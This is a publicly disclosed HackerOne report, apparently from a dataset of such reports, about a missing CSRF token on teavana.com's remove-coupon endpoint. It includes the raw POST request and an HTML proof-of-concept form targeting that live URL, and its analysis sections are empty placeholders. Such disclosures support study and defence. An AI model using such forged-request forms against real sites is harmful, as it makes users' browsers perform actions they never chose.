---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '226088'
original_report_id: '226088'
title: Missing CSRF Token On Remove Coupun From Cart
weakness: Cross-Site Request Forgery (CSRF)
team_handle: starbucks
created_at: '2017-05-11T16:03:57.693Z'
disclosed_at: '2019-02-08T19:05:20.751Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 9
asset_identifier: www.teavana.com
asset_type: URL
max_severity: none
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# Missing CSRF Token On Remove Coupun From Cart

## Metadata

- HackerOne Report ID: 226088
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: starbucks
- Disclosed At: 2019-02-08T19:05:20.751Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

Hi,
When remove coupun, there's no CSRF token, at this time i use `███████` Coupun to reproduce it.

__Vuln Request__
```
POST /on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon HTTP/1.1
Host: www.teavana.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.teavana.com/us/en/cart
Content-Length: 17
Cookie: some cookie
Connection: close

couponCode=██████████
```

__Poc Code__
```
<html>
<body>
<form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Cart-RemoveCoupon" method="POST">
<input type="hidden" name="couponCode" value="███" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

```

Edit the `coupunCode` with name of the coupun.

Thanks, 
 If you need video, i will create one !

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
